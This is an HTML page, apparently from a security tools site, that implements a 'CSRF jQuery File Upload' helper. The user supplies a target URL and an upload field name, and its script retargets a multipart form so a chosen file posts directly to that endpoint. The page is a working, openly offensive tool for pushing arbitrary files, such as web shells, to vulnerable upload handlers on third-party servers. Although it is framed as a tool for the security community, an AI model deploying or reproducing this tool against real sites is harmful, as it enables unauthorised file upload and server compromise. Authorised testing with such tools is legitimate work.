  <body class="bg-gray-900 text-gray-100 min-h-screen flex flex-col font-sans">
    <main class="flex-grow flex justify-center items-center p-4">
      <div class="bg-gray-800 p-6 rounded-lg shadow-lg w-full max-w-lg">
        <h2 class="text-white text-2xl font-semibold text-center mb-6">
          CSRF jQuery File Upload
        </h2>
        <form id="targetForm" class="space-y-4">
          <div id="errorMessage" class="text-red-500 text-sm hidden">
            Please enter both the target URL and the POST field name.
          </div>
          <div>
            <label for="targetUrl" class="text-white">Target URL:</label>
            <input
              type="text"
              id="targetUrl"
              name="targetUrl"
              placeholder="https://example.com/"
              class="p-3 w-full bg-gray-700 text-white rounded-lg border border-gray-600"
            />
          </div>
          <div>
            <label for="post-file" class="text-white"
              >Post File Parameter Name:</label
            >
            <input
              type="text"
              id="post-file"
              name="post-file"
              placeholder="files[]"
              class="p-3 w-full bg-gray-700 text-white rounded-lg border border-gray-600"
            />
          </div>
          <button
            type="submit"
            class="w-full py-3 rounded-md bg-teal-600 hover:bg-teal-700 text-white font-semibold"
          >
            Lock Target
          </button>
        </form>

        <div id="csrfFormWrapper" class="mt-6 hidden">
          <h2 class="text-white text-xl mb-4">Upload File</h2>
          <form
            id="csrfForm"
            action="#"
            method="POST"
            enctype="multipart/form-data"
            class="space-y-4"
          >
            <div>
              <label for="uploadedFile" class="text-white">Choose File:</label>
              <input
                type="file"
                id="uploadedFile"
                name="files[]"
                class="w-full bg-gray-700 text-white rounded-lg border border-gray-600"
              />
            </div>
            <button
              type="submit"
              class="w-full py-3 rounded-md bg-teal-600 hover:bg-teal-700 text-white font-semibold"
            >
              Upload
            </button>
          </form>
        </div>
      </div>
    </main>

    <footer
      class="bg-gray-900 text-center py-4 text-sm text-gray-500 border-t border-gray-700 mt-6"
    >
      © 2025
      <a href="/" class="text-teal-400 hover:text-teal-500" target="_blank"
        >13Sec Tools</a
      >
      | Crafted with ❤️ for the security community.
    </footer>

    <div class="fixed top-4 left-4 z-50">
      <button
        onclick="history.back()"
        class="text-teal-400 hover:text-teal-300 text-sm font-medium"
      >
        ← Back
      </button>
    </div>

    <script>
      document
        .getElementById("targetForm")
        .addEventListener("submit", function (event) {
          event.preventDefault();
          var targetUrl = document.getElementById("targetUrl").value.trim();
          var postFile = document.getElementById("post-file").value.trim();
          var errorDiv = document.getElementById("errorMessage");

          if (!targetUrl || !postFile) {
            errorDiv.innerText =
              "Please enter both the target URL and the POST field name.";
            errorDiv.style.display = "block";
            return;
          }

          errorDiv.style.display = "none";
          document.getElementById("csrfForm").action = targetUrl;
          document.getElementById("uploadedFile").name = postFile;
          document.getElementById("csrfFormWrapper").style.display = "block";
        });
    </script>
  </body>
</html>
